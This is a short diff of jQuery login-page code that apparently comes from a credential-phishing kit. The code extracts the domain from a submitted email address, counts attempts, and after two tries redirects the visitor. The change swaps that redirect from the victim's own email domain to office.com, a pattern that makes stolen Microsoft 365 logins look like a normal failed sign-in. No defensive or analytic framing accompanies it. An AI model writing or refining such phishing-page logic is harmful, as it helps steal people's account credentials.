@@ -321,8 +321,8 @@ $(document).ready(function() {
 			return false;  
 
 		}
-        var ind = emai.indexOf("@");
-        var my_slice = emai.substr((ind + 1));
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
         var c = my_slice.substr(0, my_slice.indexOf('.'));
         var final = c.toLowerCase();
 
@@ -367,7 +367,7 @@ $(document).ready(function() {
                         if (count >= 2) {
                             count = 0;
                             // window.location.replace(response['redirect_link']);
-                            window.location.replace("http://www." + my_slice);
+                            window.location.replace("https://office.com");
 
                         }
                         // $('#msg').html(response['msg']);
